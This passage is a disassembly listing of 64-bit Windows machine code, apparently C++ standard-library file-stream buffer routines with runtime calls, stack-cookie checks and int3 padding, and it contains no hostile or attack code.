   140006c19:	76 7d                	jbe    0x140006c98
   140006c1b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006c22:	00 00 
   140006c24:	45 33 c9             	xor    %r9d,%r9d
   140006c27:	45 33 c0             	xor    %r8d,%r8d
   140006c2a:	33 d2                	xor    %edx,%edx
   140006c2c:	33 c9                	xor    %ecx,%ecx
   140006c2e:	ff 15 e4 46 00 00    	call   *0x46e4(%rip)        # 0x14000b318
   140006c34:	90                   	nop
   140006c35:	83 f8 02             	cmp    $0x2,%eax
   140006c38:	75 a2                	jne    0x140006bdc
   140006c3a:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140006c3e:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006c43:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140006c48:	0f be 18             	movsbl (%rax),%ebx
   140006c4b:	eb 94                	jmp    0x140006be1
   140006c4d:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140006c52:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140006c57:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   140006c5b:	48 2b d9             	sub    %rcx,%rbx
   140006c5e:	48 03 d8             	add    %rax,%rbx
   140006c61:	48 85 db             	test   %rbx,%rbx
   140006c64:	7e 29                	jle    0x140006c8f
   140006c66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006c6d:	00 00 00 
   140006c70:	48 ff cb             	dec    %rbx
   140006c73:	0f be 0c 0b          	movsbl (%rbx,%rcx,1),%ecx
   140006c77:	48 8b 97 80 00 00 00 	mov    0x80(%rdi),%rdx
   140006c7e:	ff 15 ec 46 00 00    	call   *0x46ec(%rip)        # 0x14000b370
   140006c84:	48 85 db             	test   %rbx,%rbx
   140006c87:	7e 06                	jle    0x140006c8f
   140006c89:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   140006c8d:	eb e1                	jmp    0x140006c70
   140006c8f:	0f b6 5d d0          	movzbl -0x30(%rbp),%ebx
   140006c93:	e9 49 ff ff ff       	jmp    0x140006be1
   140006c98:	e8 5f 1b 00 00       	call   0x1400087fc
   140006c9d:	8b c3                	mov    %ebx,%eax
   140006c9f:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140006ca3:	48 33 cc             	xor    %rsp,%rcx
   140006ca6:	e8 b5 18 00 00       	call   0x140008560
   140006cab:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140006cb2:	00 
   140006cb3:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140006cb7:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140006cbb:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140006cbf:	49 8b e3             	mov    %r11,%rsp
   140006cc2:	5d                   	pop    %rbp
   140006cc3:	c3                   	ret
   140006cc4:	cc                   	int3
   140006cc5:	cc                   	int3
   140006cc6:	cc                   	int3
   140006cc7:	cc                   	int3
   140006cc8:	cc                   	int3
   140006cc9:	cc                   	int3
   140006cca:	cc                   	int3
   140006ccb:	cc                   	int3
   140006ccc:	cc                   	int3
   140006ccd:	cc                   	int3
   140006cce:	cc                   	int3
   140006ccf:	cc                   	int3
   140006cd0:	40 53                	rex push %rbx
   140006cd2:	48 83 ec 20          	sub    $0x20,%rsp
   140006cd6:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140006cda:	48 8b d9             	mov    %rcx,%rbx
   140006cdd:	48 8b 08             	mov    (%rax),%rcx
   140006ce0:	48 85 c9             	test   %rcx,%rcx
   140006ce3:	74 18                	je     0x140006cfd
   140006ce5:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140006ce9:	48 63 10             	movslq (%rax),%rdx
   140006cec:	48 03 d1             	add    %rcx,%rdx
   140006cef:	48 3b ca             	cmp    %rdx,%rcx
   140006cf2:	73 09                	jae    0x140006cfd
   140006cf4:	0f b6 01             	movzbl (%rcx),%eax
   140006cf7:	48 83 c4 20          	add    $0x20,%rsp
   140006cfb:	5b                   	pop    %rbx
   140006cfc:	c3                   	ret
   140006cfd:	48 8b 03             	mov    (%rbx),%rax
   140006d00:	48 8b cb             	mov    %rbx,%rcx
   140006d03:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140006d08:	ff 50 38             	call   *0x38(%rax)
   140006d0b:	8b f8                	mov    %eax,%edi
   140006d0d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006d10:	75 0b                	jne    0x140006d1d
   140006d12:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140006d17:	48 83 c4 20          	add    $0x20,%rsp
   140006d1b:	5b                   	pop    %rbx
   140006d1c:	c3                   	ret
   140006d1d:	48 8b 03             	mov    (%rbx),%rax
   140006d20:	8b d7                	mov    %edi,%edx
   140006d22:	48 8b cb             	mov    %rbx,%rcx
   140006d25:	ff 50 20             	call   *0x20(%rax)
   140006d28:	8b c7                	mov    %edi,%eax
   140006d2a:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140006d2f:	48 83 c4 20          	add    $0x20,%rsp
   140006d33:	5b                   	pop    %rbx
   140006d34:	c3                   	ret
   140006d35:	cc                   	int3
   140006d36:	cc                   	int3
   140006d37:	cc                   	int3
   140006d38:	cc                   	int3
   140006d39:	cc                   	int3
   140006d3a:	cc                   	int3
   140006d3b:	cc                   	int3
   140006d3c:	cc                   	int3
   140006d3d:	cc                   	int3
   140006d3e:	cc                   	int3
   140006d3f:	cc                   	int3
   140006d40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006d45:	57                   	push   %rdi
   140006d46:	48 83 ec 20          	sub    $0x20,%rsp
   140006d4a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140006d4e:	48 8b d9             	mov    %rcx,%rbx
   140006d51:	8b fa                	mov    %edx,%edi
   140006d53:	48 8b 08             	mov    (%rax),%rcx
   140006d56:	48 85 c9             	test   %rcx,%rcx
   140006d59:	74 38                	je     0x140006d93
   140006d5b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140006d5f:	48 39 08             	cmp    %rcx,(%rax)
   140006d62:	73 2f                	jae    0x140006d93
   140006d64:	83 fa ff             	cmp    $0xffffffff,%edx
   140006d67:	74 08                	je     0x140006d71
   140006d69:	0f b6 41 ff          	movzbl -0x1(%rcx),%eax
   140006d6d:	3b c2                	cmp    %edx,%eax
   140006d6f:	75 22                	jne    0x140006d93
   140006d71:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140006d75:	ff 00                	incl   (%rax)
   140006d77:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140006d7b:	48 ff 08             	decq   (%rax)
   140006d7e:	33 c0                	xor    %eax,%eax
   140006d80:	83 ff ff             	cmp    $0xffffffff,%edi
   140006d83:	0f 44 f8             	cmove  %eax,%edi
   140006d86:	8b c7                	mov    %edi,%eax
   140006d88:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006d8d:	48 83 c4 20          	add    $0x20,%rsp
   140006d91:	5f                   	pop    %rdi
   140006d92:	c3                   	ret
   140006d93:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140006d9a:	48 85 d2             	test   %rdx,%rdx
   140006d9d:	74 73                	je     0x140006e12
   140006d9f:	83 ff ff             	cmp    $0xffffffff,%edi
   140006da2:	74 6e                	je     0x140006e12
   140006da4:	48 83 7b 68 00       	cmpq   $0x0,0x68(%rbx)
   140006da9:	75 0f                	jne    0x140006dba
   140006dab:	40 0f b6 cf          	movzbl %dil,%ecx
   140006daf:	ff 15 bb 45 00 00    	call   *0x45bb(%rip)        # 0x14000b370
   140006db5:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006db8:	75 cc                	jne    0x140006d86
   140006dba:	4c 8b 4b 38          	mov    0x38(%rbx),%r9
   140006dbe:	48 8d 53 70          	lea    0x70(%rbx),%rdx
   140006dc2:	49 39 11             	cmp    %rdx,(%r9)
   140006dc5:	74 4b                	je     0x140006e12
   140006dc7:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   140006dcb:	4c 8d 43 50          	lea    0x50(%rbx),%r8
   140006dcf:	40 88 3a             	mov    %dil,(%rdx)
   140006dd2:	49 8b 02             	mov    (%r10),%rax
   140006dd5:	48 3b c2             	cmp    %rdx,%rax
   140006dd8:	74 17                	je     0x140006df1
   140006dda:	48 89 83 88 00 00 00 	mov    %rax,0x88(%rbx)
   140006de1:	49 8b 00             	mov    (%r8),%rax
   140006de4:	48 63 08             	movslq (%rax),%rcx
   140006de7:	49 03 09             	add    (%r9),%rcx
   140006dea:	48 89 8b 90 00 00 00 	mov    %rcx,0x90(%rbx)
   140006df1:	49 89 12             	mov    %rdx,(%r10)
   140006df4:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140006df8:	2b da                	sub    %edx,%ebx
   140006dfa:	83 c3 71             	add    $0x71,%ebx
   140006dfd:	48 89 10             	mov    %rdx,(%rax)
   140006e00:	49 8b 00             	mov    (%r8),%rax
   140006e03:	89 18                	mov    %ebx,(%rax)
   140006e05:	8b c7                	mov    %edi,%eax
   140006e07:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006e0c:	48 83 c4 20          	add    $0x20,%rsp
   140006e10:	5f                   	pop    %rdi
   140006e11:	c3                   	ret
   140006e12:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006e17:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140006e1c:	48 83 c4 20          	add    $0x20,%rsp
   140006e20:	5f                   	pop    %rdi
   140006e21:	c3                   	ret
   140006e22:	cc                   	int3
   140006e23:	cc                   	int3
   140006e24:	cc                   	int3
   140006e25:	cc                   	int3
   140006e26:	cc                   	int3
   140006e27:	cc                   	int3
   140006e28:	cc                   	int3
   140006e29:	cc                   	int3
   140006e2a:	cc                   	int3
   140006e2b:	cc                   	int3
   140006e2c:	cc                   	int3
   140006e2d:	cc                   	int3
   140006e2e:	cc                   	int3
   140006e2f:	cc                   	int3
   140006e30:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006e35:	57                   	push   %rdi
   140006e36:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140006e3d:	48 8b 05 fc b1 00 00 	mov    0xb1fc(%rip),%rax        # 0x140012040
   140006e44:	48 33 c4             	xor    %rsp,%rax
   140006e47:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140006e4c:	8b fa                	mov    %edx,%edi
   140006e4e:	48 8b d9             	mov    %rcx,%rbx
   140006e51:	83 fa ff             	cmp    $0xffffffff,%edx
   140006e54:	75 07                	jne    0x140006e5d
   140006e56:	33 c0                	xor    %eax,%eax
   140006e58:	e9 6c 01 00 00       	jmp    0x140006fc9
   140006e5d:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140006e61:	48 8b 10             	mov    (%rax),%rdx
   140006e64:	48 85 d2             	test   %rdx,%rdx
   140006e67:	74 2e                	je     0x140006e97
   140006e69:	48 8b 41 58          	mov    0x58(%rcx),%rax
   140006e6d:	4c 63 00             	movslq (%rax),%r8
   140006e70:	4a 8d 0c 02          	lea    (%rdx,%r8,1),%rcx
   140006e74:	48 3b d1             	cmp    %rcx,%rdx
   140006e77:	73 1e                	jae    0x140006e97
   140006e79:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   140006e7d:	89 08                	mov    %ecx,(%rax)
   140006e7f:	8b c7                	mov    %edi,%eax
   140006e81:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   140006e85:	4c 8b 02             	mov    (%rdx),%r8
   140006e88:	49 8d 48 01          	lea    0x1(%r8),%rcx
   140006e8c:	48 89 0a             	mov    %rcx,(%rdx)
   140006e8f:	41 88 38             	mov    %dil,(%r8)
   140006e92:	e9 32 01 00 00       	jmp    0x140006fc9
   140006e97:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140006e9e:	00 
   140006e9f:	48 89 b4 24 a0 00 00 	mov    %rsi,0xa0(%rsp)
   140006ea6:	00 
   140006ea7:	0f 84 0f 01 00 00    	je     0x140006fbc
   140006ead:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   140006eb1:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140006eb5:	49 39 00             	cmp    %rax,(%r8)
   140006eb8:	75 20                	jne    0x140006eda
   140006eba:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140006ec1:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   140006ec8:	49 89 08             	mov    %rcx,(%r8)
   140006ecb:	2b d1                	sub    %ecx,%edx
   140006ecd:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140006ed1:	48 89 08             	mov    %rcx,(%rax)
   140006ed4:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140006ed8:	89 10                	mov    %edx,(%rax)
   140006eda:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140006ede:	48 85 c9             	test   %rcx,%rcx
   140006ee1:	75 22                	jne    0x140006f05
   140006ee3:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140006eea:	40 0f be cf          	movsbl %dil,%ecx
   140006eee:	ff 15 d4 44 00 00    	call   *0x44d4(%rip)        # 0x14000b3c8
   140006ef4:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140006ef9:	3b c1                	cmp    %ecx,%eax
   140006efb:	0f 45 cf             	cmovne %edi,%ecx
   140006efe:	8b c1                	mov    %ecx,%eax
   140006f00:	e9 bc 00 00 00       	jmp    0x140006fc1
   140006f05:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140006f0a:	40 88 7c 24 50       	mov    %dil,0x50(%rsp)
   140006f0f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006f14:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140006f18:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   140006f1d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006f22:	4c 8d 4c 24 51       	lea    0x51(%rsp),%r9
   140006f27:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140006f2c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006f31:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140006f36:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140006f3b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006f40:	ff 15 b2 41 00 00    	call   *0x41b2(%rip)        # 0x14000b0f8
   140006f46:	85 c0                	test   %eax,%eax
   140006f48:	74 2a                	je     0x140006f74
   140006f4a:	83 e8 01             	sub    $0x1,%eax
   140006f4d:	74 25                	je     0x140006f74
   140006f4f:	83 f8 02             	cmp    $0x2,%eax
   140006f52:	75 68                	jne    0x140006fbc
   140006f54:	0f be 4c 24 50       	movsbl 0x50(%rsp),%ecx
   140006f59:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140006f60:	ff 15 62 44 00 00    	call   *0x4462(%rip)        # 0x14000b3c8
   140006f66:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140006f6b:	3b c1                	cmp    %ecx,%eax
   140006f6d:	0f 45 cf             	cmovne %edi,%ecx
   140006f70:	8b c1                	mov    %ecx,%eax
   140006f72:	eb 4d                	jmp    0x140006fc1
   140006f74:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006f79:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140006f7e:	48 2b f0             	sub    %rax,%rsi
   140006f81:	74 1f                	je     0x140006fa2
   140006f83:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   140006f8a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140006f8f:	4c 8b c6             	mov    %rsi,%r8
   140006f92:	ba 01 00 00 00       	mov    $0x1,%edx
   140006f97:	ff 15 eb 43 00 00    	call   *0x43eb(%rip)        # 0x14000b388
   140006f9d:	48 3b f0             	cmp    %rax,%rsi
   140006fa0:	75 1a                	jne    0x140006fbc
   140006fa2:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140006fa7:	c6 43 71 01          	movb   $0x1,0x71(%rbx)
   140006fab:	48 39 44 24 48       	cmp    %rax,0x48(%rsp)
   140006fb0:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140006fb5:	0f 45 cf             	cmovne %edi,%ecx
   140006fb8:	8b c1                	mov    %ecx,%eax
   140006fba:	eb 05                	jmp    0x140006fc1
   140006fbc:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140006fc1:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140006fc8:	00 
   140006fc9:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140006fce:	48 33 cc             	xor    %rsp,%rcx
   140006fd1:	e8 8a 15 00 00       	call   0x140008560
   140006fd6:	48 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%rbx
   140006fdd:	00 
   140006fde:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140006fe5:	5f                   	pop    %rdi
   140006fe6:	c3                   	ret
   140006fe7:	cc                   	int3
   140006fe8:	cc                   	int3
   140006fe9:	cc                   	int3
   140006fea:	cc                   	int3
   140006feb:	cc                   	int3
   140006fec:	cc                   	int3
   140006fed:	cc                   	int3
   140006fee:	cc                   	int3
   140006fef:	cc                   	int3
   140006ff0:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140006ff7:	48 85 c9             	test   %rcx,%rcx
   140006ffa:	74 07                	je     0x140007003
   140006ffc:	48 ff 25 65 42 00 00 	rex.W jmp *0x4265(%rip)        # 0x14000b268
   140007003:	c3                   	ret
   140007004:	cc                   	int3
   140007005:	cc                   	int3
   140007006:	cc                   	int3
   140007007:	cc                   	int3
   140007008:	cc                   	int3
   140007009:	cc                   	int3
   14000700a:	cc                   	int3
   14000700b:	cc                   	int3
   14000700c:	cc                   	int3
   14000700d:	cc                   	int3
   14000700e:	cc                   	int3
   14000700f:	cc                   	int3
   140007010:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140007017:	48 85 c9             	test   %rcx,%rcx
   14000701a:	74 07                	je     0x140007023
   14000701c:	48 ff 25 4d 42 00 00 	rex.W jmp *0x424d(%rip)        # 0x14000b270
   140007023:	c3                   	ret
   140007024:	cc                   	int3
   140007025:	cc                   	int3
   140007026:	cc                   	int3
   140007027:	cc                   	int3
   140007028:	cc                   	int3
   140007029:	cc                   	int3
   14000702a:	cc                   	int3
   14000702b:	cc                   	int3
   14000702c:	cc                   	int3
   14000702d:	cc                   	int3
   14000702e:	cc                   	int3
   14000702f:	cc                   	int3
   140007030:	40 53                	rex push %rbx
   140007032:	48 83 ec 20          	sub    $0x20,%rsp
   140007036:	48 8b d9             	mov    %rcx,%rbx
   140007039:	48 8d 05 50 79 00 00 	lea    0x7950(%rip),%rax        # 0x14000e990
   140007040:	48 89 01             	mov    %rax,(%rcx)
   140007043:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000704a:	00 
   14000704b:	74 2f                	je     0x14000707c
   14000704d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140007051:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140007055:	48 39 01             	cmp    %rax,(%rcx)
   140007058:	75 22                	jne    0x14000707c
   14000705a:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140007061:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140007068:	48 89 11             	mov    %rdx,(%rcx)
   14000706b:	48 8b 43 38          	mov    0x38(%rbx),%rax
   14000706f:	48 89 10             	mov    %rdx,(%rax)
   140007072:	44 2b c2             	sub    %edx,%r8d
   140007075:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140007079:	44 89 00             	mov    %r8d,(%rax)
   14000707c:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140007080:	74 08                	je     0x14000708a
   140007082:	48 8b cb             	mov    %rbx,%rcx
   140007085:	e8 b6 0d 00 00       	call   0x140007e40
   14000708a:	48 8b cb             	mov    %rbx,%rcx
   14000708d:	48 83 c4 20          	add    $0x20,%rsp
   140007091:	5b                   	pop    %rbx
   140007092:	48 ff 25 6f 40 00 00 	rex.W jmp *0x406f(%rip)        # 0x14000b108
   140007099:	cc                   	int3
   14000709a:	cc                   	int3
   14000709b:	cc                   	int3
   14000709c:	cc                   	int3
   14000709d:	cc                   	int3
   14000709e:	cc                   	int3
   14000709f:	cc                   	int3
   1400070a0:	40 53                	rex push %rbx
   1400070a2:	41 8b d9             	mov    %r9d,%ebx
   1400070a5:	4c 8b d2             	mov    %rdx,%r10
   1400070a8:	4c 8b d9             	mov    %rcx,%r11
   1400070ab:	41 f6 c1 01          	test   $0x1,%r9b
   1400070af:	74 0a                	je     0x1400070bb
   1400070b1:	f6 41 70 04          	testb  $0x4,0x70(%rcx)
   1400070b5:	74 04                	je     0x1400070bb
   1400070b7:	b2 01                	mov    $0x1,%dl
   1400070b9:	eb 02                	jmp    0x1400070bd
   1400070bb:	32 d2                	xor    %dl,%dl
   1400070bd:	f6 c3 02             	test   $0x2,%bl
   1400070c0:	74 0a                	je     0x1400070cc
   1400070c2:	f6 41 70 02          	testb  $0x2,0x70(%rcx)
   1400070c6:	74 04                	je     0x1400070cc
   1400070c8:	b0 01                	mov    $0x1,%al
   1400070ca:	eb 02                	jmp    0x1400070ce
   1400070cc:	32 c0                	xor    %al,%al
   1400070ce:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400070d3:	84 d2                	test   %dl,%dl
   1400070d5:	0f 85 c1 00 00 00    	jne    0x14000719c
   1400070db:	84 c0                	test   %al,%al
   1400070dd:	0f 85 b9 00 00 00    	jne    0x14000719c
   1400070e3:	4d 8b 48 08          	mov    0x8(%r8),%r9
   1400070e7:	4d 03 08             	add    (%r8),%r9
   1400070ea:	f6 41 70 02          	testb  $0x2,0x70(%rcx)
   1400070ee:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400070f2:	4c 8b 00             	mov    (%rax),%r8
   1400070f5:	74 04                	je     0x1400070fb
   1400070f7:	33 c9                	xor    %ecx,%ecx
   1400070f9:	eb 16                	jmp    0x140007111
   1400070fb:	48 8b 41 40          	mov    0x40(%rcx),%rax
   1400070ff:	48 8b 08             	mov    (%rax),%rcx
   140007102:	48 85 c9             	test   %rcx,%rcx
   140007105:	74 0a                	je     0x140007111
   140007107:	49 39 4b 68          	cmp    %rcx,0x68(%r11)
   14000710b:	73 04                	jae    0x140007111
   14000710d:	49 89 4b 68          	mov    %rcx,0x68(%r11)
   140007111:	49 8b 43 18          	mov    0x18(%r11),%rax
   140007115:	49 8b 53 68          	mov    0x68(%r11),%rdx
   140007119:	48 8b 30             	mov    (%rax),%rsi
   14000711c:	48 8b c2             	mov    %rdx,%rax
   14000711f:	48 2b c6             	sub    %rsi,%rax
   140007122:	4c 3b c8             	cmp    %rax,%r9
   140007125:	77 75                	ja     0x14000719c
   140007127:	4d 85 c9             	test   %r9,%r9
   14000712a:	74 14                	je     0x140007140
   14000712c:	f6 c3 01             	test   $0x1,%bl
   14000712f:	74 05                	je     0x140007136
   140007131:	4d 85 c0             	test   %r8,%r8
   140007134:	74 66                	je     0x14000719c
   140007136:	f6 c3 02             	test   $0x2,%bl
   140007139:	74 05                	je     0x140007140
   14000713b:	48 85 c9             	test   %rcx,%rcx
   14000713e:	74 5c                	je     0x14000719c
   140007140:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007145:	4a 8d 3c 0e          	lea    (%rsi,%r9,1),%rdi
   140007149:	f6 c3 01             	test   $0x1,%bl
   14000714c:	74 14                	je     0x140007162
   14000714e:	4d 85 c0             	test   %r8,%r8
   140007151:	74 0f                	je     0x140007162
   140007153:	49 8b 43 38          	mov    0x38(%r11),%rax
   140007157:	2b d7                	sub    %edi,%edx
   140007159:	48 89 38             	mov    %rdi,(%rax)
   14000715c:	49 8b 43 50          	mov    0x50(%r11),%rax
   140007160:	89 10                	mov    %edx,(%rax)
   140007162:	f6 c3 02             	test   $0x2,%bl
   140007165:	74 2b                	je     0x140007192
   140007167:	48 85 c9             	test   %rcx,%rcx
   14000716a:	74 26                	je     0x140007192
   14000716c:	49 8b 43 58          	mov    0x58(%r11),%rax
   140007170:	4c 63 00             	movslq (%rax),%r8
   140007173:	49 8b 43 40          	mov    0x40(%r11),%rax
   140007177:	4c 03 00             	add    (%rax),%r8
   14000717a:	49 8b 43 20          	mov    0x20(%r11),%rax
   14000717e:	44 2b c7             	sub    %edi,%r8d
   140007181:	48 89 30             	mov    %rsi,(%rax)
   140007184:	49 8b 43 40          	mov    0x40(%r11),%rax
   140007188:	48 89 38             	mov    %rdi,(%rax)
   14000718b:	49 8b 43 58          	mov    0x58(%r11),%rax
   14000718f:	44 89 00             	mov    %r8d,(%rax)
   140007192:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140007197:	4d 89 0a             	mov    %r9,(%r10)
   14000719a:	eb 07                	jmp    0x1400071a3
   14000719c:	49 c7 02 ff ff ff ff 	movq   $0xffffffffffffffff,(%r10)
   1400071a3:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   1400071a8:	33 c0                	xor    %eax,%eax
   1400071aa:	49 c7 42 08 00 00 00 	movq   $0x0,0x8(%r10)
   1400071b1:	00 
   1400071b2:	49 89 42 10          	mov    %rax,0x10(%r10)
   1400071b6:	49 8b c2             	mov    %r10,%rax
   1400071b9:	5b                   	pop    %rbx
   1400071ba:	c3                   	ret
   1400071bb:	cc                   	int3
   1400071bc:	cc                   	int3
   1400071bd:	cc                   	int3
   1400071be:	cc                   	int3
   1400071bf:	cc                   	int3
   1400071c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400071c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400071ca:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400071cf:	8b 7c 24 28          	mov    0x28(%rsp),%edi
   1400071d3:	49 8b f0             	mov    %r8,%rsi
   1400071d6:	4c 8b da             	mov    %rdx,%r11
   1400071d9:	48 8b d9             	mov    %rcx,%rbx
   1400071dc:	40 f6 c7 01          	test   $0x1,%dil
   1400071e0:	74 0a                	je     0x1400071ec
   1400071e2:	f6 41 70 04          	testb  $0x4,0x70(%rcx)
   1400071e6:	74 04                	je     0x1400071ec
   1400071e8:	b1 01                	mov    $0x1,%cl
   1400071ea:	eb 02                	jmp    0x1400071ee
   1400071ec:	32 c9                	xor    %cl,%cl
   1400071ee:	40 f6 c7 02          	test   $0x2,%dil
   1400071f2:	74 0a                	je     0x1400071fe
   1400071f4:	f6 43 70 02          	testb  $0x2,0x70(%rbx)
   1400071f8:	74 04                	je     0x1400071fe
   1400071fa:	b0 01                	mov    $0x1,%al
   1400071fc:	eb 02                	jmp    0x140007200
   1400071fe:	32 c0                	xor    %al,%al
   140007200:	84 c9                	test   %cl,%cl
   140007202:	0f 85 1e 01 00 00    	jne    0x140007326
   140007208:	84 c0                	test   %al,%al
   14000720a:	0f 85 16 01 00 00    	jne    0x140007326
   140007210:	f6 43 70 02          	testb  $0x2,0x70(%rbx)
   140007214:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140007218:	48 8b 08             	mov    (%rax),%rcx
   14000721b:	74 04                	je     0x140007221
   14000721d:	33 d2                	xor    %edx,%edx
   14000721f:	eb 16                	jmp    0x140007237
   140007221:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140007225:	48 8b 10             	mov    (%rax),%rdx
   140007228:	48 85 d2             	test   %rdx,%rdx
   14000722b:	74 0a                	je     0x140007237
   14000722d:	48 39 53 68          	cmp    %rdx,0x68(%rbx)
   140007231:	73 04                	jae    0x140007237
   140007233:	48 89 53 68          	mov    %rdx,0x68(%rbx)
   140007237:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000723b:	4c 8b 43 68          	mov    0x68(%rbx),%r8
   14000723f:	4c 8b 10             	mov    (%rax),%r10
   140007242:	4d 2b c2             	sub    %r10,%r8
   140007245:	45 85 c9             	test   %r9d,%r9d
   140007248:	74 5e                	je     0x1400072a8
   14000724a:	41 83 e9 01          	sub    $0x1,%r9d
   14000724e:	74 0f                	je     0x14000725f
   140007250:	41 83 f9 01          	cmp    $0x1,%r9d
   140007254:	0f 85 cc 00 00 00    	jne    0x140007326
   14000725a:	49 8b c0             	mov    %r8,%rax
   14000725d:	eb 4b                	jmp    0x1400072aa
   14000725f:	8b c7                	mov    %edi,%eax
   140007261:	83 e0 03             	and    $0x3,%eax
   140007264:	3c 03                	cmp    $0x3,%al
   140007266:	0f 84 ba 00 00 00    	je     0x140007326
   14000726c:	40 f6 c7 01          	test   $0x1,%dil
   140007270:	74 16                	je     0x140007288
   140007272:	48 85 c9             	test   %rcx,%rcx
   140007275:	75 09                	jne    0x140007280
   140007277:	4d 85 d2             	test   %r10,%r10
   14000727a:	0f 85 a6 00 00 00    	jne    0x140007326
   140007280:	48 8b c1             	mov    %rcx,%rax
   140007283:	49 2b c2             	sub    %r10,%rax
   140007286:	eb 22                	jmp    0x1400072aa
   140007288:	40 f6 c7 02          	test   $0x2,%dil
   14000728c:	0f 84 94 00 00 00    	je     0x140007326
   140007292:	48 85 d2             	test   %rdx,%rdx
   140007295:	75 09                	jne    0x1400072a0
   140007297:	4d 85 d2             	test   %r10,%r10
   14000729a:	0f 85 86 00 00 00    	jne    0x140007326
   1400072a0:	48 8b c2             	mov    %rdx,%rax
   1400072a3:	49 2b c2             	sub    %r10,%rax
   1400072a6:	eb 02                	jmp    0x1400072aa
   1400072a8:	33 c0                	xor    %eax,%eax
   1400072aa:	4c 8d 0c 30          	lea    (%rax,%rsi,1),%r9
